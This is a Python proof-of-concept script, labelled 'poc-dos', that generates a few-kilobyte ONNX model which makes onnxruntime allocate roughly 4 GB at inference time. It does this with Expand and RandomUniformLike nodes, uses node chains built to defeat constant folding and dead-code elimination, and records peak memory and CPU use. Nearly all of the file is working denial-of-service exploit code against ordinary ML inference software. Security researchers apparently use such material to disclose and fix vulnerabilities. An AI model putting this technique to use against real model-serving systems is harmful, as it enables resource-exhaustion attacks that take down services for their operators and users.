import os
import time
import threading

import psutil
import numpy as np
import onnx
import onnxruntime as ort
from onnx import helper, TensorProto


# -----------------------------
# Peak RSS sampler
# -----------------------------
class PeakRSSSampler:
    """
    Periodically samples process RSS and records the peak value.
    Used to demonstrate run-time physical memory commit.
    """
    def __init__(self, sample_interval_sec=0.003):
        self.sample_interval = sample_interval_sec
        self.peak_rss_bytes = 0
        self._stop_event = threading.Event()
        self._thread = None

    def _sample_loop(self):
        process = psutil.Process(os.getpid())
        while not self._stop_event.is_set():
            try:
                rss = process.memory_info().rss
                if rss > self.peak_rss_bytes:
                    self.peak_rss_bytes = rss
            except Exception:
                pass
            time.sleep(self.sample_interval)

    def __enter__(self):
        self.peak_rss_bytes = 0
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._sample_loop, daemon=True)
        self._thread.start()
        return self

    def __exit__(self, exc_type, exc, tb):
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=1.0)


def current_rss_mb() -> float:
    return psutil.Process(os.getpid()).memory_info().rss / (1024 ** 2)


def file_size_kb(path: str) -> float:
    return os.path.getsize(path) / 1024.0


# -----------------------------
# Model builder (V16 pattern)
# -----------------------------
def build_resource_amplification_model(model_path: str, target_gb: int = 4):
    """
    Builds a minimal ONNX model that demonstrates resource amplification
    via Expand (logical view) followed by RandomUniformLike (forced materialization).
    """
    # float32 = 4 bytes
    num_elements = int((target_gb * 1024 ** 3) // 4)
    dim = int(np.sqrt(num_elements))
    height, width = dim, dim
    target_shape = [height, width]

    trigger_input = helper.make_tensor_value_info(
        "trigger", TensorProto.FLOAT, []
    )

    const_one = helper.make_tensor("const_one", TensorProto.FLOAT, [], [1.0])
    const_zero = helper.make_tensor("const_zero", TensorProto.FLOAT, [], [0.0])
    shape_tensor = helper.make_tensor(
        "target_shape", TensorProto.INT64, [2], target_shape
    )

    allow_value = helper.make_tensor("allow", TensorProto.FLOAT, [], [1.0])
    deny_value = helper.make_tensor("deny", TensorProto.FLOAT, [], [0.0])

    # Anti-folding chain (runtime-dependent)
    node_identity = helper.make_node(
        "Identity", ["trigger"], ["trigger_id"]
    )
    node_mul_zero = helper.make_node(
        "Mul", ["trigger_id", "const_zero"], ["zeroed"]
    )
    node_add_one = helper.make_node(
        "Add", ["zeroed", "const_one"], ["runtime_scalar"]
    )

    # Expand: logical broadcast view
    node_expand = helper.make_node(
        "Expand", ["runtime_scalar", "target_shape"], ["expanded_view"]
    )

    # RandomUniformLike: forces full allocation and sequential writes
    node_random = helper.make_node(
        "RandomUniformLike",
        ["expanded_view"],
        ["materialized_tensor"],
        dtype=TensorProto.FLOAT,
    )

    # DCE lock and scalar outputs
    node_reduce = helper.make_node(
        "ReduceSum", ["materialized_tensor"], ["sum_out"], keepdims=0
    )
    node_compare = helper.make_node(
        "Greater", ["sum_out", "const_zero"], ["is_positive"]
    )
    node_where = helper.make_node(
        "Where", ["is_positive", "allow", "deny"], ["security_flag"]
    )

    security_output = helper.make_tensor_value_info(
        "security_flag", TensorProto.FLOAT, []
    )
    sum_output = helper.make_tensor_value_info(
        "sum_out", TensorProto.FLOAT, []
    )

    graph = helper.make_graph(
        [
            node_identity,
            node_mul_zero,
            node_add_one,
            node_expand,
            node_random,
            node_reduce,
            node_compare,
            node_where,
        ],
        "V16_Resource_Amplification_DoS",
        [trigger_input],
        [security_output, sum_output],
        [const_one, const_zero, shape_tensor, allow_value, deny_value],
    )

    model = helper.make_model(
        graph,
        producer_name="poc-dos",
        ir_version=8,
        opset_imports=[helper.make_opsetid("", 15)],
    )

    onnx.save(model, model_path)
    return height, width


# -----------------------------
# Runner with measurement
# -----------------------------
def run_model(model_path: str, timeout_sec: float = 20.0):
    session_options = ort.SessionOptions()
    session_options.graph_optimization_level = ort.GraphOptimizationLevel.ORT_ENABLE_ALL
    session_options.intra_op_num_threads = 1
    session_options.inter_op_num_threads = 1

    rss_before = current_rss_mb()
    process = psutil.Process(os.getpid())
    cpu_before = process.cpu_times()

    session = ort.InferenceSession(
        model_path, session_options, providers=["CPUExecutionProvider"]
    )
    rss_after_init = current_rss_mb()

    trigger_value = np.array(1.0, dtype=np.float32)

    start_time = time.time()
    timed_out = False
    result = None

    with PeakRSSSampler() as sampler:
        try:
            result = session.run(None, {"trigger": trigger_value})
        except Exception as exc:
            result = exc
        finally:
            elapsed = time.time() - start_time
            if elapsed > timeout_sec:
                timed_out = True

    cpu_after = process.cpu_times()
    rss_final = current_rss_mb()
    peak_rss_mb = sampler.peak_rss_bytes / (1024 ** 2)

    report = {
        "model_kb": file_size_kb(model_path),
        "rss_mb_before": rss_before,
        "rss_mb_after_init": rss_after_init,
        "rss_mb_final": rss_final,
        "rss_mb_peak": peak_rss_mb,
        "rss_mb_delta_after_init_to_peak": peak_rss_mb - rss_after_init,
        "wall_time_sec": elapsed,
        "cpu_user_sec": float(cpu_after.user - cpu_before.user),
        "cpu_system_sec": float(cpu_after.system - cpu_before.system),
        "timed_out": timed_out,
    }

    if isinstance(result, Exception):
        report["result"] = f"EXCEPTION: {type(result).__name__}: {str(result)[:120]}"
    else:
        security_flag = float(np.array(result[0]).item())
        sum_value = float(np.array(result[1]).astype(np.float32).item())
        report["result"] = f"OK: security={security_flag} sum={sum_value}"

    return report


def main():
    model_path = "v16_dos.onnx"
    height, width = build_resource_amplification_model(model_path, target_gb=4)

    print(
        f"Built {model_path} shape=[{height},{width}] "
        f"size={file_size_kb(model_path):.1f}KB"
    )

    report = run_model(model_path, timeout_sec=20.0)

    print("\n[Report]")
    for key, value in report.items():
        print(f"{key}: {value}")


if __name__ == "__main__":
    main()